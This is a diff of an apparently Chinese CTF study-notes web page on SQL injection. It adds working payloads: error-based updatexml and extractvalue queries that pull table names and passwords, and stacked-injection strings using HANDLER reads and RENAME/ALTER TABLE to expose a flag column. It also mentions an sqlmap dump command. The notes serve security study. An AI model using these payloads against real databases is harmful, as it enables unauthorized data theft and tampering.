@@ -428,16 +428,10 @@ sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --du
 <h2 id="获取table-name"><a href="#获取table-name" class="headerlink" title="获取table_name"></a>获取table_name</h2><pre><code class="sql"> and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))=101  --+ 
 </code></pre>
 <p>获取长度</p>
-<pre><code class="sql"> and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;))&gt;1  --+ ```
-
-## 变种mid() ##
-
-用法和 substr 相同
-
-## left() ##
-
-```sql
-select left(&#39;awaawawa&#39;,3) #return awa
+<pre><code class="sql"> and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;))&gt;1  --+ 
+</code></pre>
+<h2 id="变种mid"><a href="#变种mid" class="headerlink" title="变种mid()"></a>变种mid()</h2><p>用法和 substr 相同</p>
+<h2 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h2><pre><code class="sql">select left(&#39;awaawawa&#39;,3) #return awa
 </code></pre>
 <h1 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h1><p>用 ascii()  (变种ord) 转换为ascii码</p>
 <pre><code class="sql">select ascii(substr(database(),2,1)) = 33 and sleep(2);
@@ -451,10 +445,61 @@ select left(&#39;awaawawa&#39;,3) #return awa
 </code></pre>
 <h1 id="floor-x-返回一个小于x的整数"><a href="#floor-x-返回一个小于x的整数" class="headerlink" title="floor(x) 返回一个小于x的整数"></a>floor(x) 返回一个小于x的整数</h1><pre><code class="sql">select floor(1.1)/*1*/,floor(0.99)/*0*/,floor(2.1)/*2*/
 </code></pre>
-<h1 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h1><pre><code class="sql">updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
+<h1 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h1><p>updatexml:</p>
+<pre><code class="sql">updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
 </code></pre>
 <p>被截断</p>
 <pre><code class="sql">updatexml(1,(mid(concat(0x7e,(select flag from flag limit 0,1),0x7e),0,31)),3) --+
+</code></pre>
+<p>extractvalue</p>
+<pre><code class="sql">
+&#39;admin &#39;^extractvalue(1,concat(0x5c,(select(database()))))%23
+
+extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x5c))%23
+
+extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(((table_schema)like(database()))and((table_name)like(&#39;H4rDsq1&#39;)))),0x5c))%23
+
+^extractvalue(1,concat(0x5c,(select(group_concat(password))from(H4rDsq1)),0x5c))%23
+
+被截断
+
+extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),32),0x5c))%23
+
+extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),20),0x5c))%23
+</code></pre>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>考察堆叠注入</p>
+<pre><code class="sql">
+&#39;;show tables--+
+</code></pre>
+<p>得到表名</p>
+<pre><code class="sql">
+&#39;;show columns from `1919810931114514`--+
+</code></pre>
+<p>得到flag字段</p>
+<p>最后</p>
+<pre><code class="sql">
+1&#39;; handler `1919810931114514` open as `a`; handler `a` read next;#
+</code></pre>
+<p>handler</p>
+<pre><code class="txt">
+ mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
+</code></pre>
+<pre><code class="sql">1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
+</code></pre>
+<p>rename:</p>
+<p>修改一个或多个表的名称</p>
+<pre><code class="sql">RENAME TABLE old_table_name TO new_table_name;
+</code></pre>
+<p>alert:</p>
+<p>向表中添加字段</p>
+<pre><code class="sql">Alter table [表名] add [列名] 类型
+</code></pre>
+<p>保留old和new列名</p>
+<pre><code>列名：a ----&gt;b 列类型
+　　　ALTER TABLE t1 CHANGE a b INTEGER;
+</code></pre>
+<p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
+<pre><code class="sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
 </code></pre>
 <h1 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h1><p><a href="https://www.anquanke.com/post/id/253570#h2-1">参考</a></p>
 <p>主要利用 <code>replace</code> 这个函数</p>
